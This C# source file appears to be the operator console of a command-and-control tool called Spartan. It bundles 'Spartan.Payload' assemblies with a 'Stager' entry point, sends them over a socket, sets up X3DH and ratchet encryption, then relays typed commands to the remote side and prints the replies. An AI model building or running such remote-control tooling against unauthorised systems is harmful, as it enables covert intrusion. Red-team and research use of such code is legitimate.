﻿using System.Net;
using Spartan.Models;
using Spartan.Server;

namespace Spartan.CLI;

internal static class Program
{
    private static void Main(string[] args)
    {
        var socketServer = new SocketServer(IPAddress.Parse("127.0.0.1"), 12345);
        const string payloadDirectory = "/Users/hkeshavr/Developer/Spartan/Spartan.Payload/bin/Release/net9.0/publish";

        var payload = GeneratePayload(payloadDirectory);

        socketServer.SendData(payload, false);

        socketServer.PerformX3dhHandshake();
        socketServer.InitializeRatchet();

        while (true)
        {
            Console.Write("> ");
            var input = Console.ReadLine();
            socketServer.SendData(input);
            var response = socketServer.ReceiveData<string>();
            Console.WriteLine(response);
        }
    }

    private static PayloadModel GeneratePayload(string payloadDirectory)
    {
        var files = Directory.GetFiles(payloadDirectory, "*.dll");

        Dictionary<string, byte[]> assemblyBinaries = new();

        // Write each file as a name-content pair
        foreach (var filePath in files)
            assemblyBinaries[Path.GetFileNameWithoutExtension(filePath)] = File.ReadAllBytes(filePath);

        var payload = new PayloadModel
        {
            PayloadName = "Spartan.Payload",
            PayloadEntryPoint = "Spartan.Payload.Stager",
            AssemblyBinaries = assemblyBinaries
        };

        return payload;
    }
}